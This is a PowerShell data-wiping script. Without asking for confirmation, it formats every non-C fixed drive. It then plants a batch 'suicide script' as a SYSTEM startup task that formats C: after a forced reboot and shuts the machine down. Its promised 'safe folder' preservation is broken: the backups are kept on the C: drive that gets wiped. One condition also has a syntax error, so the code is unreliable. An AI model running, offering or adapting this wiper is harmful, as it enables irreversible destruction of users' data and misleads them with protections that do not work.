<#
.SYNOPSIS
Total Drive Annihilation - Permanent Data Destruction with Safe Folder Exclusion

.DESCRIPTION
Supports multiple safe folders specified as a comma-separated list or via CSV file
Example: $SafeFolders = "C:\Users, C:\Windows"
CSV Format: Path,IncludeSubfolders
#>

# ===== CONFIG =====
$WipePasses = 1  # Set to 3 for DoD 5220.22-M compliance (slower)
$SafeFolders = "C:\Users"  # Comma-separated list of folders to preserve
$SafeFoldersCsv = $null    # Path to CSV file with folders to preserve (optional)

# Process safe folders from CSV if specified, otherwise use $SafeFolders
if ($SafeFoldersCsv -and (Test-Path $SafeFoldersCsv)) {
    $safeFoldersArray = Import-Csv $SafeFoldersCsv | ForEach-Object {
        $_.Path
    }
} else {
    $safeFoldersArray = $SafeFolders.Split(',') | ForEach-Object { $_.Trim() }
}

# Remove duplicates and validate paths
$safeFoldersArray = $safeFoldersArray | Sort-Object -Unique | Where-Object {
    $_ -match '^[a-zA-Z]:\\' -and (Test-Path $_)
}

$NonC_Drives = Get-Partition | Where-Object { 
    $_.DriveLetter -and 
    $_.DriveLetter -ne 'C' -and 
    (Get-Volume -DriveLetter $_.DriveLetter).DriveType -eq 'Fixed'
} | Select-Object -ExpandProperty DriveLetter

# ===== FUNCTIONS =====
function Invoke-TotalWipe {
    param([string]$DriveLetter)
    try {
        Write-Host "[!] NUKE INITIATED ON DRIVE $DriveLetter"
        Format-Volume -DriveLetter $DriveLetter -FileSystem NTFS -Force -Confirm:$false -NumberOfPasses $WipePasses
        Write-Host "[✓] DRIVE $DriveLetter ERASED" -ForegroundColor Green
    } catch {
        Write-Host "[X] FAILED TO WIPE $DriveLetter : $_" -ForegroundColor Red
    }
}

function Protect-SafeFolders {
    param([array]$Folders)
    foreach ($folder in $Folders) {
        $markerPath = Join-Path $folder "DO_NOT_DELETE_SAFE_FOLDER"
        if (-not (Test-Path $folder)) {
            New-Item -ItemType Directory -Path $folder -Force | Out-Null
        }
        Set-Content -Path $markerPath -Value "This folder is protected from deletion" -Force
        Write-Host "[!] SAFE FOLDER MARKER CREATED: $markerPath"
    }
}

# ===== MAIN EXECUTION =====
Write-Host "=== TOTAL DATA ANNIHILATION ===" -ForegroundColor Red

# Display safe folders
if ($safeFoldersArray) {
    Write-Host "SAFE FOLDERS PRESERVED:" -ForegroundColor Yellow
    $safeFoldersArray | ForEach-Object { Write-Host "  - $_" }
    Protect-SafeFolders -Folders $safeFoldersArray
} else {
    Write-Host "[!] NO SAFE FOLDERS SPECIFIED - ALL DATA WILL BE DESTROYED" -ForegroundColor Yellow
}

# ---- PHASE 1: DESTROY NON-C DRIVES ----
foreach ($Drive in $NonC_Drives) {
    Invoke-TotalWipe -DriveLetter $Drive
}

# ---- PHASE 2: SCHEDULE C: DESTRUCTION ----
if (Get-Partition -DriveLetter 'C' -ErrorAction SilentlyContinue)) {
    Write-Host "[!] PREPARING C: DRIVE EXECUTION" -ForegroundColor Yellow

    # Create the suicide script with safe folder handling
    $KillScript = @"
@echo off
setlocal enabledelayedexpansion

:: List of safe folders to preserve
set SAFE_FOLDERS=$($safeFoldersArray -join ';')

timeout /t 5 > nul
echo PREPARING SAFE FOLDER PRESERVATION...

:: Create temp root directory
set TEMP_ROOT=%SystemDrive%\TEMP_SAFE_%RANDOM%
mkdir "%TEMP_ROOT%"

:: Backup each safe folder
for %%f in ("%SAFE_FOLDERS:;=" "%") do (
    set "folder=%%~f"
    if exist "!folder!" (
        set "folder_name=!folder:\=_!"
        set "folder_name=!folder_name::=!"
        set "backup_dir=!TEMP_ROOT!\!folder_name!"
        echo BACKING UP: !folder! to !backup_dir!
        robocopy "!folder!" "!backup_dir!" /E /COPYALL /MIR /R:1 /W:1 > nul
    )
)

:: Wipe C: drive
echo WIPING C: DRIVE...
format C: /FS:NTFS /P:$WipePasses /Y > nul

:: Restore safe folders
for %%f in ("%SAFE_FOLDERS:;=" "%") do (
    set "folder=%%~f"
    set "folder_name=!folder:\=_!"
    set "folder_name=!folder_name::=!"
    set "backup_dir=!TEMP_ROOT!\!folder_name!"
    
    if exist "!backup_dir!" (
        echo RESTORING: !folder! from !backup_dir!
        mkdir "!folder!"
        robocopy "!backup_dir!" "!folder!" /E /COPYALL /MIR > nul
    )
)

:: Cleanup
rd /s /q "%TEMP_ROOT%"
shutdown /s /t 0
"@

    $ScriptPath = "$env:Temp\killc.cmd"
    $KillScript | Out-File -FilePath $ScriptPath -Force -Encoding ascii

    # Schedule it to run at next boot
    schtasks /create /tn "C_Drive_Killer" /tr "$ScriptPath" /sc ONSTART /ru SYSTEM /f | Out-Null

    # ---- PHASE 3: FORCE RESTART ----
    Write-Host "[!] REBOOTING TO FINISH C: DRIVE..." -ForegroundColor Magenta
    if ($safeFoldersArray) {
        Write-Host "[!] SAFE FOLDERS WILL BE PRESERVED:" -ForegroundColor Cyan
        $safeFoldersArray | ForEach-Object { Write-Host "  - $_" -ForegroundColor Cyan }
    }
    Restart-Computer -Force
}

# ---- FINAL MESSAGE ----
$safeFoldersList = if ($safeFoldersArray) { $safeFoldersArray -join ", " } else { "None" }
Write-Host @"

=== MISSION COMPLETE ===
- All non-C drives: ERASED
- C: drive: SCHEDULED FOR DESTRUCTION ON REBOOT
- Safe folders preserved: $safeFoldersList
- System will SHUT DOWN after C: is wiped

(╯°□°)╯︵ ┻━┻  GOODBYE!
"@ -ForegroundColor Cyan